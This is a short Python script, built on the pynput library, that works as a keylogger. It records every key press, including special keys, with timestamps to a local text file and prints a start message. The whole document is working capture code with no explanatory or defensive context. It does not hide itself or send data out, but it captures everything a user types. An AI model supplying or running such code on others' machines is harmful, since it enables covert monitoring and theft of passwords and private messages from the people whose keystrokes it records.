from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

# File name with timestamp
log_file = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"

# Logging setup
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

print(f"[+] Keylogger started. Logging to: {log_file}")

# Function to log key presses
def on_press(key):
    try:
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special Key: {key}")

# Start listening
with Listener(on_press=on_press) as listener:
    listener.join()
